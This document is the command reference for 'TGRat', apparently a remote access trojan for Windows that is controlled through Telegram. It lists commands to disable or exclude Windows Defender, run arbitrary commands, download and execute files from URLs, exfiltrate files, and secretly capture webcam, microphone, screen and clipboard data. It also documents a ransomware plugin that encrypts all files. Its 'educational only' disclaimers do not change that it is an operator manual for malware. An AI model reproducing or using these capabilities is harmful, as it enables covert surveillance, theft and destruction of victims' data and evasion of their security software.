# 📋 TGRat - Complete Command Reference

## 📁 File Management

### `/ls [path]`
List files and directories

**Usage:**
```
/ls                    - List current directory
/ls /                  - List all drives
/ls C:\Users           - List specific path
```

---

### `/cd <path>`
Change current directory

**Usage:**
```
/cd C:\Users\Documents
/cd ..
```

---

### `/back`
Go to parent directory

**Usage:**
```
/back                  - Go up one level
```

From root (C:\) → Returns to drive list (/)

---

### `/pwd`
Show current path

**Usage:**
```
/pwd                   - Display current directory
```

---

### `/mkdir <name>`
Create new directory

**Usage:**
```
/mkdir NewFolder
```

---

### `/delete <name>`
Delete file or directory

**Usage:**
```
/delete file.txt
/delete FolderName
```

⚠️ **Warning:** Permanent deletion!

---

### `/rename <old>/n<new>`
Rename file or directory

**Usage:**
```
/rename oldname.txt/nnewname.txt
```

---

### `/copy <source>/to<destination>`
Copy file or directory

**Usage:**
```
/copy file.txt/tobackup.txt
/copy C:\folder1/toC:\folder2
```

---

### `/move <source>/to<destination>`
Move file or directory

**Usage:**
```
/move file.txt/toC:\NewLocation
```

---

## 📥 File Transfer

### `/download <filename>`
Download file from client to Telegram

**Usage:**
```
/download document.pdf
/download C:\Users\file.txt
```

**Limits:**
- Max 50MB per file (Telegram limitation)
- Large files split automatically

---

### `/upload [filename]`
Upload file from Telegram to client

**Usage:**
1. Send `/upload desiredname.txt`
2. Reply to confirmation with your file
3. File saved as desiredname.txt on client

**Alternative:** Just send file without command (saved with original name)

---

### `/download_link <URL> [0]`
Download file from URL to client

**Usage:**
```
/download_link https://example.com/file.exe        - Download and run
/download_link https://example.com/file.exe 0      - Download only (don't run)
```

---

## ⚙️ System & Commands

### `/run <filename>`
Execute program or file

**Usage:**
```
/run notepad.exe
/run C:\setup.exe
```

---

### `/execute <command>`
Execute CMD or PowerShell command

**Usage:**
```
/execute dir
/execute ipconfig /all
/execute powershell Get-Process
```

**Output:** Returns command result

---

### `/sysinfo`
Get system information

**Returns:**
- CPU model and usage
- RAM total and used
- Disk space
- OS version
- Computer name

---

### `/tasklist`
Get list of running processes

**Returns:** TXT file with all processes

**Format:**
```
PID    Name             Memory
1234   chrome.exe       150MB
5678   notepad.exe      5MB
```

---

### `/taskkill <name or PID>`
Terminate process

**Usage:**
```
/taskkill notepad.exe
/taskkill 1234
```

---

### `/restart`
Restart client application

**Usage:**
```
/restart
```

⚠️ **Note:** Experimental feature, may be unstable

---

### `/cmdbomb`
Open 10 CMD windows (spam)

**Usage:**
```
/cmdbomb
```

**Effect:** Opens 10 command prompts

---

### `/wd_exclude [path]`
Add to Windows Defender exclusions

**Usage:**
```
/wd_exclude                    - Add client EXE to exclusions
/wd_exclude C:\MyApp           - Add specific path
```

⚠️ **Requires:** Administrator rights

---

### `/killwindef`
Temporarily disable Windows Defender

**Usage:**
```
/killwindef
```

⚠️ **Requires:** Administrator rights
⚠️ **Warning:** Security risk!

---

### `/grant <path>`
Take ownership of file/folder

**Usage:**
```
/grant C:\Windows\System32\file.dll
```

**Uses:** TakeOwn + Icacls commands

---

## 💬 Interface & Notifications

### `/msg [type] [title]/t<text>`
Show popup message on client

**Usage:**
```
/msg info Hello/tThis is a message
/msg warning Alert/tPlease read this
/msg error Critical/tSystem error!
```

**Types:**
- `info` - Information icon
- `warning` - Warning icon
- `error` - Error icon

---

### `/changeclipboard <text>`
Set clipboard content

**Usage:**
```
/changeclipboard https://example.com
/changeclipboard Secret text here
```

---

### `/clipboard`
Get current clipboard content

**Usage:**
```
/clipboard
```

---

## 🖱️ Input & Screen Control

### `/screenshot` or `/sc`
Take screenshot

**Usage:**
```
/screenshot
/sc
```

**Returns:** Image in Telegram

---

### `/photo [index]`
Take photo from webcam

**Usage:**
```
/photo              - Use default webcam (index 0)
/photo 1            - Use second webcam
```

---

### `/minimize`
Minimize active window

**Usage:**
```
/minimize
```

---

### `/maximize`
Maximize active window

**Usage:**
```
/maximize
```

---

### `/altf4`
Close active window

**Usage:**
```
/altf4
```

---

### `/keypress <keys>`
Press key combination

**Usage:**
```
/keypress alt f4
/keypress win r
/keypress ctrl alt delete
/keypress enter
```

**Supported keys:**
- Modifiers: `ctrl`, `alt`, `shift`, `win`
- Function: `f1`-`f12`
- Special: `enter`, `esc`, `tab`, `space`
- Letters: `a`-`z`
- Numbers: `0`-`9`

---

### `/holdkey <seconds> <keys>`
Hold key for N seconds

**Usage:**
```
/holdkey 5 w           - Hold W for 5 seconds
/holdkey 10 shift      - Hold Shift for 10 seconds
```

---

### `/mouseclick`
Perform mouse click

**Usage:**
```
/mouseclick            - Left click at current position
```

---

### `/mousemove <X> <Y>`
Move mouse cursor

**Usage:**
```
/mousemove 500 300     - Move to coordinates (500, 300)
```

---

### `/keytype <text>`
Type text (supports Cyrillic)

**Usage:**
```
/keytype Hello World
/keytype Привет мир
```

---

### `/open_image <seconds> <path>`
Open image fullscreen for N seconds

**Usage:**
```
/open_image 5 C:\scary.jpg     - Show image for 5 seconds
```

**Effect:** Fullscreen image display (prank mode)

---

### `/applist [index]`
List windows or bring window to front

**Usage:**
```
/applist               - Show all open windows
/applist 1             - Bring window #1 to front
```

---

### `/applist_close <index>`
Close selected window

**Usage:**
```
/applist_close 2       - Close window #2
```

---

### `/applist_title <index> <new_title>`
Rename window title

**Usage:**
```
/applist_title 1 New Window Name
```

---

### `/whereami`
Show path of running client EXE

**Usage:**
```
/whereami
```

**Returns:** Full path to client executable

---

## 👾 Automation

### `/mousemesstart`
Start random mouse movement

**Usage:**
```
/mousemesstart
```

**Effect:** Mouse moves randomly (prevents screen lock)

---

### `/mousemesstop`
Stop random mouse movement

**Usage:**
```
/mousemesstop
```

---

### `/auto <seconds> [screen|webcam|both] [camera_index]`
Auto-send screenshots/photos at interval

**Usage:**
```
/auto 30 screen                - Screenshot every 30 seconds
/auto 60 webcam                - Webcam photo every 60 seconds
/auto 45 both                  - Both every 45 seconds
/auto 30 webcam 1              - Use camera 1
```

---

### `/stop`
Stop /auto command

**Usage:**
```
/stop
```

---

## 🔇 Multimedia

### `/playsound <path>`
Play audio file on client

**Usage:**
```
/playsound C:\music.mp3
/playsound C:\Windows\Media\notify.wav
```

---

### `/stopsound`
Stop audio playback

**Usage:**
```
/stopsound
```

---

### `/mic <seconds>`
Record from microphone

**Usage:**
```
/mic 10                - Record 10 seconds
```

**Limit:** Maximum 30 seconds

---

### `/webcam <index> <seconds>`
Record video from webcam

**Usage:**
```
/webcam 0 15           - Record 15 seconds from camera 0
/webcam 1 20           - Record 20 seconds from camera 1
```

**Limit:** Maximum 30 seconds

---

### `/screenrecord <seconds>`
Record screen video

**Usage:**
```
/screenrecord 30       - Record 30 seconds
```

**Limit:** Maximum 60 seconds

---

### `/volumeplus [N]`
Increase volume

**Usage:**
```
/volumeplus            - Increase by 2%
/volumeplus 10         - Increase by 10%
```

---

### `/volumeminus [N]`
Decrease volume

**Usage:**
```
/volumeminus           - Decrease by 2%
/volumeminus 10        - Decrease by 10%
```

---

## 📎 Plugins

### `/plugins_reload` or `/pl_upd`
Reload plugin list

**Usage:**
```
/plugins_reload
/pl_upd
```

---

### `/plugins`
Open plugin management panel

**Usage:**
```
/plugins
```

**Shows:** List of available plugins with ON/OFF status

---

### `/pl_on <ID>`
Enable plugin

**Usage:**
```
/pl_on ransomware
/pl_on gdi
```

---

### `/pl_off <ID>`
Disable plugin

**Usage:**
```
/pl_off ransomware
```

---

### `/pl_rm <ID>`
Delete plugin from disk

**Usage:**
```
/pl_rm old_plugin
```

⚠️ **Warning:** Permanent deletion!

---

### `/install_lib <URL>`
Install Python library from URL

**Usage:**
```
/install_lib https://files.pythonhosted.org/package.whl
```

---

## 🔧 Miscellaneous

### `/help`
Show command list

**Usage:**
```
/help
```

---

### `/wallpaper <path>`
Set desktop wallpaper

**Usage:**
```
/wallpaper C:\Pictures\background.jpg
```

---

### `/block`
Block mouse and keyboard

**Usage:**
```
/block
```

⚠️ **Warning:** Client machine becomes unusable!

---

### `/unblock`
Unblock mouse and keyboard

**Usage:**
```
/unblock
```

---

### `/location`
Get client geolocation

**Returns:**
- Country
- City
- IP address
- ISP

---

### `/update [pastebin_raw]`
Update client software

**Usage:**
```
/update https://pastebin.com/raw/newversion
```

**Process:**
1. Download new version
2. Replace current file
3. Restart client

---

### `/clients`
List active clients and history

**Shows:**
- Online clients
- Last seen time
- System info
- Direct links to topics

---

### `/clients_off`
List offline clients

**Shows:**
- Offline clients
- Last online time
- Total offline duration

---

### `/version`
Get client software version

**Usage:**
```
/version
```

---

## 🎨 Plugin Commands

### GDI Plugin (`/gdi`)

Visual effects on client screen

**Available effects:**
- `tunnel` - Screen shrinks infinitely
- `melt` - Pixels drip down
- `errors` - Spam error icons
- `invert` - Color inversion
- `hell` - Shake + inversion
- `train` - Horizontal waves
- `shake` - Intense screen shake
- `bounce` - Screen chunks bounce

**Usage:**
```
/gdi                       - Show help
/gdi melt                  - Start melt effect (infinite)
/gdi shake 15              - Shake for 15 seconds
/gdi_stop shake            - Stop shake effect
/gdi_stop all              - Stop all effects
```

---

### Ransomware Plugin (`/lock`)

File encryption (XOR cipher)

**Commands:**
```
/lock_help                 - Show help
/lock_set                  - View current config
/lock_set ext *            - Encrypt ALL files
/lock_set ext doc txt      - Only .doc and .txt
/lock_set size 100         - Max file size 100MB
/lock_set path auto        - Follow /cd command
/lock_set path C:\         - Fixed path
/lock_set safe off         - Disable system folder protection

/lock mypassword           - Encrypt with password
/unlock mypassword         - Decrypt with password
/lock_stop                 - Stop encryption
```

⚠️ **EXTREME WARNING:**
- **VERY DANGEROUS** - Can destroy data!
- Use ONLY for educational purposes!
- Test on VM first!
- Remember your password!

---

## 💡 Tips & Tricks

### File Paths
- Use full paths: `C:\Users\Name\file.txt`
- Or relative: `file.txt` (current directory)

### Command Chaining
Send multiple commands by sending messages quickly

### Batch Operations
Use text file with commands, then `/execute` to run

### Remote Desktop
Combine `/screenshot` + `/keypress` + `/mouseclick` for manual control

---

## ⚠️ Important Notes

1. **Administrator Rights**
   - Some commands require admin (UAC elevation)
   - Run client with admin rights for full functionality

2. **Antivirus**
   - Add to exclusions if needed
   - Use `/wd_exclude` command

3. **Network**
   - Requires internet connection
   - Firewall may block connection

4. **Privacy**
   - All commands logged on server
   - Screenshots sent via Telegram (not encrypted end-to-end)

5. **Legal**
   - **ONLY** use on your own devices
   - Unauthorized access is **ILLEGAL**
   - For educational purposes only

---

## 🆘 Need Help?

- 📖 Read [README.md](README.md) for setup
- 🐛 Report bugs on GitHub Issues
- 💬 Join discussions for questions

---

**Remember: Use responsibly and ethically!** 🛡️
